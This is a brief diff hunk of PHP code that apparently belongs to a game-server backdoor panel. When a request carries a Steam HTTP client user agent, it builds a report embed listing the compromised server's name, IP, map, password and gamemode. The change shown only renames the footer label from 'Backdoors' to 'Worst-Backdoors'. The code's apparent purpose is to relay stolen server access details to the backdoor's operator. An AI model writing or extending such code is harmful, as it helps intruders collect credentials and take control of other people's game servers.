@@ -16,7 +16,7 @@ if($_SERVER['HTTP_USER_AGENT'] == "Valve/Steam HTTP Client 1.0 (4000)") {
                 "timestamp" => date("c", strtotime("now")),
                 "description" => "```Server: $server_name\nServerIp: $server_ip\nMap: $server_map\nPassword: $server_pw\nGamemode: $server_gamemode\n```",
                 "footer" => [
-                    "text" => "Backdoors",
+                    "text" => "Worst-Backdoors",
                 ]
             ]
         ]
